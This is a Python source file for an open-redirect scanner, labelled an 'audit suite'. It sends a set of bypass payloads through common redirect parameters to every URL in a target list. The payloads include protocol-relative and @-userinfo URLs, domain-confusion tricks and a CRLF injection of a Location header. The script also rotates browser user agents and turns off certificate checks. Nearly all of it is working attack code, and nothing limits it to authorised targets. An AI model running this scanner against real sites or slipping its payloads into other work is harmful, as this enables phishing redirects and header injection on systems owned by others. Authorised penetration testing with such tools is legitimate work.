# ultimate_redirect_hunter_prod.py - Enterprise Audit Suite (Clean Parameters)
import sys
import time
import os
import random
import urllib.parse
import argparse
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize Colorama for terminal styling
init(autoreset=True)

BANNER = f"""{Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}
 █     █░ ██▓     ▄▄▄█████▓ ██▓  ███▄    █  ▄▄▄      ▄▄▄█████▓▓█████ 
▓█░ █   ░█░▓██▒     ▓  ██▒ ▓▒▓██▒ ██ ▀█   █ ▒████▄    ▓  ██▒ ▓▒▓█   ▀ 
              [ ENGINE v4.1 - CLEAN PARAMETER AUDIT SUITE ]
{Style.RESET_ALL}"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
]

TARGET_PARAMS = ['rd', 'url', 'redirect', 'next', 'goto', 'callback', 'return', 'dest', 'target', 'redir', 'redirect_url']

def get_headers(host):
    """Generates standard request headers simulating a legitimate browser session."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Host": host,
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

def compile_payloads(trusted_domain, attack_domain):
    """Compiles standard open redirect bypass arrays."""
    clean_attack = attack_domain.replace("https://", "").replace("http://", "").split('/')[0]
    return [
        f"https://{clean_attack}",
        f"//{clean_attack}",
        f"https://{trusted_domain}@{clean_attack}",
        f"https://{trusted_domain}.{clean_attack}",
        f"https://{clean_attack}/{trusted_domain}",
        f"https://{trusted_domain}%0D%0ALocation%3A%20https%3A%2F%2F{clean_attack}"
    ]

def audit_endpoint(session, target_url, attack_domain, delay, show_all):
    """Processes clean parameter variations against the live web server."""
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.netloc
    if not host: 
        return

    base_path = f"{parsed.scheme}://{host}{parsed.path}"
    print(f"\n{Fore.BLUE}[*] Scanning: {Fore.WHITE}{host}{Style.RESET_ALL}")
    
    # Pool parameters found on the input URL along with default baseline targets
    existing_params = list(urllib.parse.parse_qs(parsed.query).keys())
    master_params = list(set(existing_params + TARGET_PARAMS))

    for param in master_params:
        print(f"    -> Testing Parameter: {Fore.CYAN}'{param}'{Style.RESET_ALL}")
        payloads = compile_payloads(host, attack_domain)
        
        for payload in payloads:
            # Construct a clean, single-parameter query structure
            query_data = {param: payload}
            
            exploit_target = f"{base_path}?{urllib.parse.urlencode(query_data)}"
            time.sleep(delay)
            
            try:
                # Send the clean request without extraneous signature flags
                res = session.get(exploit_target, headers=get_headers(host), allow_redirects=False, timeout=6, verify=False)
                location = res.headers.get("Location", "")
                clean_attack = attack_domain.replace("https://", "").replace("http://", "").split('/')[0]
                
                # Evaluation Rule A: Server side header-based redirection
                if res.status_code in [301, 302, 303, 307, 308] and clean_attack in location:
                    print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] OPEN REDIRECT VULNERABILITY CONFIRMED!{Style.RESET_ALL}")
                    print(f"    URL: {Fore.WHITE}{exploit_target}{Style.RESET_ALL}\n")
                    break
                
                # Evaluation Rule B: Reflection inside client side JS navigation scripts
                if clean_attack in res.text:
                    if "window.location" in res.text or "location.replace" in res.text or "meta http-equiv" in res.text:
                        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] POTENTIAL DOM-BASED REDIRECT REFLECTED!{Style.RESET_ALL}")
                        print(f"    URL: {Fore.WHITE}{exploit_target} (Verify source manually){Style.RESET_ALL}\n")
                        break

                if show_all:
                    # Clip length of displayed payload to keep console logs neat
                    short_p = payload if len(payload) < 40 else f"{payload[:37]}..."
                    print(f"        [Tried] {param}={short_p} -> HTTP {res.status_code}")

            except requests.exceptions.RequestException:
                if show_all:
                    print(f"        {Fore.RED}[DROP]{Fore.RESET} Connection timeout or block.")
                continue

def main():
    print(BANNER)
    # Suppress SSL certificate warning strings caused by verify=False operations
    requests.packages.urllib3.disable_warnings() 
    
    parser = argparse.ArgumentParser(description="Clean Parameter Production Auditor")
    parser.add_argument("-l", "--list", required=True, help="Path to targets file")
    parser.add_argument("-t", "--target", default="testfire.net", help="Control redirect domain")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Time delay interval")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show all attempts")
    args = parser.parse_args()

    if not os.path.exists(args.list): 
        print(f"{Fore.RED}[!] Target file path error. Verify configuration filename.{Style.RESET_ALL}")
        return

    with open(args.list, 'r') as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    session = requests.Session()
    for target in targets:
        audit_endpoint(session, target, args.target, args.delay, args.verbose)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Script execution suspended.{Style.RESET_ALL}")
        sys.exit(0)
